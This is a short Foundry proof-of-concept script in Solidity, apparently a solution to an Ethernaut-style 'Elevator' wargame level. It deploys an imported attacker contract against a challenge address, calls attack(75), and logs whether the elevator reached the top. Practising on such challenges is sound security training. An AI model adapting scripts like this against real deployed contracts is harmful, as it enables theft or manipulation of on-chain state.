// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {StairwayToHeaven} from "../src/11_Elevator.sol";

interface IElevator {
    function top() external view returns (bool);
}

contract PoC is Script {
    address payable immutable elevator =
        payable(0xbEd2A62C26eC563e2499c4b9e47383995C6912B3); // Replace with your Elevator instance

    function run() external payable {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        console2.log("Is this the top?", IElevator(elevator).top());

        StairwayToHeaven stairwayToHeaven = new StairwayToHeaven(elevator);
        stairwayToHeaven.attack(75);

        console2.log("Is this the top?", IElevator(elevator).top());

        vm.stopBroadcast();
    }
}
